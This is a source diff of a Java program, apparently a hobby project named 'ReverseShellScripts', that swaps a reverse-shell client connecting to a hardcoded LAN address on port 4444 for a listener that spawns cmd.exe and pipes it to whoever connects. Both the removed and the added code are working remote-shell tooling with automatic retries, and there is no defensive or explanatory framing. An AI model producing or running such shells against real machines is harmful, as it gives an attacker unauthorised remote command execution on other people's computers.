@@ -1,73 +1,68 @@
-package NetworkShell;
+package ReverseShellScripts;
 
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.net.InetAddress;
-import java.net.Socket;
-import java.net.UnknownHostException;
+import java.io.*;
+import java.net.*;
+import java.util.Random;
 
-//connects to reverse shell within same network
+//listener for reverse shell to allow connection within same network
 
-public class ReverseShellConnector {
+public class ReverseShellListener {
+    public static void main(String[] args) {
+        int port = 4444;
+        Random random = new Random();
+        boolean isConnected = false;
+        final String PASSWORD = "PASSWORD";
 
-    public static void main() {
-        boolean ConnectingToHost = true;
-        InetAddress myIp = null;//discover IP
-        try {
-            myIp = InetAddress.getLocalHost();
-        } catch (UnknownHostException e) {
-            throw new RuntimeException(e);
-        }
-        String host = "192.168.1.92";//Listener IP
-        int port = 4444; //Listener port
-        System.out.println("Device IP:" + myIp);
-        System.out.println("Attempting to connect to: " + host + ":" + port);
-        while (ConnectingToHost) {
+
+        while (true) {  // run forever
+            try (ServerSocket serverSocket = new ServerSocket(port)) {
+                System.out.println("Listening for incoming connection on port " + port + "...");
+
+                try (Socket socket = serverSocket.accept()) {
+                    System.out.println("Connection received from " + socket.getInetAddress());
+                    isConnected = true;  // connection established
+
+                    Process process = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
+
+                    InputStream processInput = process.getInputStream();
+                    OutputStream processOutput = process.getOutputStream();
+                    InputStream socketInput = socket.getInputStream();
+                    OutputStream socketOutput = socket.getOutputStream();
+
+                    while (!socket.isClosed() && process.isAlive()) {
+                        while (processInput.available() > 0) {
+                            socketOutput.write(processInput.read());
+                        }
+                        while (socketInput.available() > 0) {
+                            processOutput.write(socketInput.read());
+                        }
+
+                        socketOutput.flush();
+                        processOutput.flush();
+
+                        Thread.sleep(50);
+                    }
+
+                    process.destroy();
+                    System.out.println("Shell closed.");
+                    isConnected = false;  // reset for retry
+                } catch (Exception e) {
+                    System.err.println("Error during connection: " + e.getMessage());
+                    e.printStackTrace();
+                }
+            } catch (IOException e) {
+                System.err.println("Could not listen on port " + port);
+                e.printStackTrace();
+            }
+
             try {
-
-                //run cmd.exe
-                Process process = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
-
-                Socket socket = new Socket(host, port);
-                InputStream processInput = process.getInputStream();
-                OutputStream processOutput = process.getOutputStream();
-                InputStream socketInput = socket.getInputStream();
-                OutputStream socketOutput = socket.getOutputStream();
-
-                while (!socket.isClosed()) {
-                    while (processInput.available() > 0) {
-                        socketOutput.write(processInput.read());
-                    }
-
-                    while (socketInput.available() > 0) {
-                        processOutput.write(socketInput.read());
-                    }
-
-                    socketOutput.flush();
-                    processOutput.flush();
-
-                    try {
-                        process.exitValue();
-                        break;
-                    } catch (Exception ignored) {
-                    }
-
-                    Thread.sleep(50);
-                }
-
-                process.destroy();
-                socket.close();
-                System.out.println("Shell closed");
-
-            }catch(Exception e){
-                System.err.println("Reverse shell error: " + e.getMessage());
-                try {
-                    Thread.sleep(5000);
-                } catch (InterruptedException ex) {
-                    throw new RuntimeException(ex);
-                }
+                int wait = 1000 + random.nextInt(14000); // 1 to 15 seconds
+                System.out.println("Attempting to reconnect in " + wait + " milliseconds.");
+                Thread.sleep(wait);
+            } catch (InterruptedException ex) {
+                System.err.println("Sleep interrupted");
+                ex.printStackTrace();
             }
         }
-       }
     }
-
+}
